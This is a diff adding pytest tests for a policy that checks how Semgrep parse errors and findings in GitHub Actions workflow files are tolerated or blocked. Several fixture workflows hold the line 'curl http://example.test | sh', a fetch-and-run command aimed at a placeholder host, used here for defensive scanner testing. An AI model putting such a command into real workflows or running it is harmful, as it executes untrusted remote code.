@@ -6070,3 +6070,332 @@ def test_run_workflow_local_validates_all_when_base_unresolved(
     act_cmd = sink["act_cmd"]
     assert isinstance(act_cmd, list)
     assert ".github/workflows/imported.yml" in act_cmd
+
+
+_ACTIONS_EXPRESSION_WORKFLOW = (
+    "jobs:\n"
+    "  build:\n"
+    "    steps:\n"
+    "      - shell: bash\n"
+    "        run: |\n"
+    '          if [ "${{ steps.filter.outputs.agents }}" = "true" ]; then\n'
+    "            curl http://example.test | sh\n"
+    "          fi\n"
+)
+
+_PLAIN_BASH_WORKFLOW = (
+    "jobs:\n"
+    "  build:\n"
+    "    steps:\n"
+    "      - shell: bash\n"
+    "        run: |\n"
+    '          if [ "true" = "true" ]; then\n'
+    "            curl http://example.test | sh\n"
+    "          fi\n"
+)
+
+_PYTHON_SHELL_WORKFLOW = (
+    "jobs:\n"
+    "  build:\n"
+    "    steps:\n"
+    "      - shell: python3 {0}\n"
+    "        run: |\n"
+    "          import os\n"
+    "          print(os.getcwd())\n"
+)
+
+_DEFAULT_SHELL_EXPRESSION_WORKFLOW = (
+    "jobs:\n"
+    "  build:\n"
+    "    steps:\n"
+    "      - run: |\n"
+    '          echo "${{ github.sha }}"\n'
+    "          curl http://example.test | sh\n"
+)
+
+_MIXED_STEPS_WORKFLOW = (
+    "jobs:\n"
+    "  build:\n"
+    "    steps:\n"
+    "      - shell: bash\n"
+    "        run: |\n"
+    '          echo "${{ github.sha }}"\n'
+    "      - shell: bash\n"
+    "        run: |\n"
+    "          curl http://example.test | sh\n"
+)
+
+
+def _semgrep_span_location(
+    path: Path,
+    content: str,
+    start_marker: str,
+    end_marker: str,
+) -> dict[str, object]:
+    start = content.index(start_marker)
+    end = content.index(end_marker) + len(end_marker)
+    return {
+        "path": str(path),
+        "start": {
+            "line": content[:start].count("\n") + 1,
+            "col": start - content.rfind("\n", 0, start),
+            "offset": start,
+        },
+        "end": {
+            "line": content[:end].count("\n") + 1,
+            "col": end - content.rfind("\n", 0, end),
+            "offset": end,
+        },
+    }
+
+
+def _retarget_span(error: dict[str, object], content: str, end_marker: str) -> None:
+    error_type = error["type"]
+    assert isinstance(error_type, list)
+    locations = error_type[1]
+    assert isinstance(locations, list)
+    location = locations[0]
+    assert isinstance(location, dict)
+    end = content.index(end_marker) + len(end_marker)
+    location["end"] = {
+        "line": content[:end].count("\n") + 1,
+        "col": end - content.rfind("\n", 0, end),
+        "offset": end,
+    }
+
+
+def _semgrep_return_code(target: Path, error: dict[str, object], repo_root: Path) -> int:
+    payload = {"errors": [error], "paths": {"scanned": [str(target)]}}
+    result = policy._verify_semgrep_targets(
+        _completed(0, json.dumps(payload)),
+        [str(target)],
+        repo_root,
+    )
+    return result.returncode
+
+
+def test_semgrep_allows_partial_parsing_at_bash_step_with_actions_expression(
+    tmp_path: Path,
+) -> None:
+    target = tmp_path / "workflow.yml"
+    target.write_text(_ACTIONS_EXPRESSION_WORKFLOW, encoding="utf-8")
+    error = _powershell_partial_parsing_error(target, line=5)
+    _retarget_span(error, _ACTIONS_EXPRESSION_WORKFLOW, "curl http://example.test | sh")
+
+    assert _semgrep_return_code(target, error, tmp_path) == 0
+
+
+def test_semgrep_allows_partial_parsing_at_python_shell_step(tmp_path: Path) -> None:
+    target = tmp_path / "workflow.yml"
+    target.write_text(_PYTHON_SHELL_WORKFLOW, encoding="utf-8")
+    error = _powershell_partial_parsing_error(target, line=5)
+    _retarget_span(error, _PYTHON_SHELL_WORKFLOW, "print(os.getcwd())")
+
+    assert _semgrep_return_code(target, error, tmp_path) == 0
+
+
+def test_semgrep_allows_partial_parsing_at_default_shell_step_with_expression(
+    tmp_path: Path,
+) -> None:
+    target = tmp_path / "workflow.yml"
+    target.write_text(_DEFAULT_SHELL_EXPRESSION_WORKFLOW, encoding="utf-8")
+    error = _powershell_partial_parsing_error(target, line=4)
+    _retarget_span(error, _DEFAULT_SHELL_EXPRESSION_WORKFLOW, "curl http://example.test | sh")
+
+    assert _semgrep_return_code(target, error, tmp_path) == 0
+
+
+def test_semgrep_blocks_partial_parsing_at_plain_bash_step(tmp_path: Path) -> None:
+    target = tmp_path / "workflow.yml"
+    target.write_text(_PLAIN_BASH_WORKFLOW, encoding="utf-8")
+    error = _powershell_partial_parsing_error(target, line=5)
+    _retarget_span(error, _PLAIN_BASH_WORKFLOW, "curl http://example.test | sh")
+
+    assert _semgrep_return_code(target, error, tmp_path) == 2
+
+
+def test_semgrep_blocks_when_only_one_matched_step_carries_an_expression(
+    tmp_path: Path,
+) -> None:
+    target = tmp_path / "workflow.yml"
+    content = _MIXED_STEPS_WORKFLOW
+    target.write_text(content, encoding="utf-8")
+    error = _powershell_partial_parsing_error(target, line=5)
+    error_type = error["type"]
+    assert isinstance(error_type, list)
+    error["type"] = [
+        error_type[0],
+        [
+            _semgrep_span_location(target, content, 'echo "${{', 'github.sha }}"'),
+            _semgrep_span_location(target, content, "curl http", "example.test | sh"),
+        ],
+    ]
+
+    assert _semgrep_return_code(target, error, tmp_path) == 2
+
+
+def test_semgrep_blocks_expression_step_error_reported_at_error_level(
+    tmp_path: Path,
+) -> None:
+    target = tmp_path / "workflow.yml"
+    target.write_text(_ACTIONS_EXPRESSION_WORKFLOW, encoding="utf-8")
+    error = _powershell_partial_parsing_error(target, line=5)
+    _retarget_span(error, _ACTIONS_EXPRESSION_WORKFLOW, "curl http://example.test | sh")
+    error["level"] = "error"
+
+    assert _semgrep_return_code(target, error, tmp_path) == 2
+
+
+def test_semgrep_blocks_expression_step_error_from_an_unknown_rule(tmp_path: Path) -> None:
+    target = tmp_path / "workflow.yml"
+    target.write_text(_ACTIONS_EXPRESSION_WORKFLOW, encoding="utf-8")
+    error = _powershell_partial_parsing_error(
+        target,
+        line=5,
+        rule_id="python.lang.security.audit.eval-detected",
+    )
+    _retarget_span(error, _ACTIONS_EXPRESSION_WORKFLOW, "curl http://example.test | sh")
+
+    assert _semgrep_return_code(target, error, tmp_path) == 2
+
+
+def test_semgrep_allows_code_two_error_at_bash_step_with_actions_expression(
+    tmp_path: Path,
+) -> None:
+    target = tmp_path / "workflow.yml"
+    content = (
+        "jobs:\n"
+        "  build:\n"
+        "    steps:\n"
+        "      - shell: bash\n"
+        "        run: |\n"
+        '          echo "${{ github.sha }}"\n'
+    )
+    target.write_text(content, encoding="utf-8")
+    error = _powershell_semgrep_error(
+        target,
+        sorted(policy.SEMGREP_POWERSHELL_RULES)[0],
+        script='echo "${{ github.sha }}"',
+    )
+
+    assert _semgrep_return_code(target, error, tmp_path) == 0
+
+
+@pytest.mark.parametrize(
+    "shell",
+    [
+        "pwsh",
+        "powershell",
+        "PowerShell.exe",
+        "python",
+        "python3 {0}",
+        "node",
+        "ruby",
+        "perl",
+        "cmd /C",
+    ],
+)
+def test_non_bash_shells_defeat_the_bash_subparse(shell: str) -> None:
+    assert policy._is_non_bash_shell(shell) is True
+
+
+@pytest.mark.parametrize(
+    "shell",
+    [
+        None,
+        "bash",
+        "sh",
+        "bash --noprofile --norc -eo pipefail {0}",
+        "bash -e {0}",
+        "bash -c 'python script.py'",
+        "nodejs",
+        "cmdline",
+    ],
+)
+def test_bash_shells_do_not_defeat_the_bash_subparse(shell: str | None) -> None:
+    assert policy._is_non_bash_shell(shell) is False
+
+
+@pytest.mark.parametrize(
+    "body",
+    [
+        'echo "${{ github.sha }}"',
+        "echo ${{matrix.os}}",
+        "echo ${{\n  github.sha\n}}",
+    ],
+)
+def test_actions_expressions_defeat_the_bash_subparse(body: str) -> None:
+    assert policy._step_defeats_bash_subparse("bash", body) is True
+
+
+@pytest.mark.parametrize(
+    "body",
+    ["echo hello", "echo ${HOME}", "echo $ {{ github.sha }}", "echo ${{}}"],
+)
+def test_plain_bash_bodies_do_not_defeat_the_bash_subparse(body: str) -> None:
+    assert policy._step_defeats_bash_subparse("bash", body) is False
+
+
+def test_semgrep_blocks_an_aliased_script_reused_under_a_bash_step(tmp_path: Path) -> None:
+    target = tmp_path / "workflow.yml"
+    content = (
+        "jobs:\n"
+        "  build:\n"
+        "    steps:\n"
+        "      - shell: pwsh\n"
+        "        run: &script |\n"
+        "          Write-Host 'hi'\n"
+        "      - shell: bash\n"
+        "        run: *script\n"
+    )
+    target.write_text(content, encoding="utf-8")
+    error = _powershell_partial_parsing_error(target, line=5)
+    _retarget_span(error, content, "Write-Host 'hi'")
+
+    assert _semgrep_return_code(target, error, tmp_path) == 2
+
+
+def test_tolerated_errors_never_downgrade_a_semgrep_finding(tmp_path: Path) -> None:
+    """A tolerated parse error must not mask a real finding.
+
+    Semgrep reports ``curl | sh`` as a finding even when the same ``run:`` block
+    also triggers a Bash sub-parse failure, so the carve-out must pass semgrep's
+    own verdict through untouched rather than reporting success.
+    """
+    target = tmp_path / "workflow.yml"
+    target.write_text(_ACTIONS_EXPRESSION_WORKFLOW, encoding="utf-8")
+    error = _powershell_partial_parsing_error(target, line=5)
+    _retarget_span(error, _ACTIONS_EXPRESSION_WORKFLOW, "curl http://example.test | sh")
+    payload = {"errors": [error], "paths": {"scanned": [str(target)]}}
+
+    result = policy._verify_semgrep_targets(
+        _completed(1, json.dumps(payload)),
+        [str(target)],
+        tmp_path,
+    )
+
+    assert result.returncode == 1
+
+
+def test_tolerated_errors_do_not_suppress_findings_reported_alongside_them(
+    tmp_path: Path,
+) -> None:
+    """The carve-out inspects only the error manifest, never the results list."""
+    target = tmp_path / "workflow.yml"
+    target.write_text(_ACTIONS_EXPRESSION_WORKFLOW, encoding="utf-8")
+    error = _powershell_partial_parsing_error(target, line=5)
+    _retarget_span(error, _ACTIONS_EXPRESSION_WORKFLOW, "curl http://example.test | sh")
+    payload = {
+        "errors": [error],
+        "results": [{"check_id": "yaml.github-actions.security.gha-curl-pipe-shell"}],
+        "paths": {"scanned": [str(target)]},
+    }
+
+    result = policy._verify_semgrep_targets(
+        _completed(1, json.dumps(payload)),
+        [str(target)],
+        tmp_path,
+    )
+
+    assert result.returncode == 1
+    assert "gha-curl-pipe-shell" in result.stdout
